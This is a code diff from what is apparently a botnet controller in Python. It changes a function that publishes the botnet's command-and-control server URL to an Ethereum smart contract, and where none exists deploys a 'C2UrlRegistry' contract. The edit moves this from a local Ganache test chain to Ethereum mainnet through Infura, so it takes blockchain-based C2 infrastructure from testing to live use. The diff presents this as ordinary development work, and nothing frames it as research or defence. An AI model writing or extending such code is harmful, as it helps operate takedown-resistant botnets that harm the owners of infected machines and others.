@@ -286,14 +286,15 @@ def issue_c2_command():
 from web3 import Web3
 
 # --- Blockchain Integration ---
-GANACHE_URL = "http://127.0.0.1:7545"
+INFURA_PROJECT_ID = "YOUR_INFURA_PROJECT_ID"  # Replace with your Infura project ID
+INFURA_URL = f"https://mainnet.infura.io/v3/{INFURA_PROJECT_ID}"
 CONTRACT_META_FILE = "botnet/contract_meta.json"
 
 def update_c2_url_on_blockchain(c2_url):
     try:
         with open(CONTRACT_META_FILE, 'r') as f:
             contract_meta = json.load(f)
-        w3 = Web3(Web3.HTTPProvider(GANACHE_URL))
+        w3 = Web3(Web3.HTTPProvider(INFURA_URL))
         contract_instance = get_contract_instance(w3, contract_meta['address'], contract_meta['abi'])
         set_c2_url(contract_instance, w3, c2_url)
         logger.info(f"Successfully updated C2 URL on the blockchain: {c2_url}")
@@ -301,7 +302,7 @@ def update_c2_url_on_blockchain(c2_url):
         logger.warning(f"{CONTRACT_META_FILE} not found. Deploying a new contract.")
         with open('botnet/C2UrlRegistry.sol', 'r') as f:
             solidity_source = f.read()
-        w3 = Web3(Web3.HTTPProvider(GANACHE_URL))
+        w3 = Web3(Web3.HTTPProvider(INFURA_URL))
         contract_interface = compile_contract(solidity_source)
         contract_address = deploy_contract(w3, contract_interface)
         logger.info(f"Contract deployed at: {contract_address}")
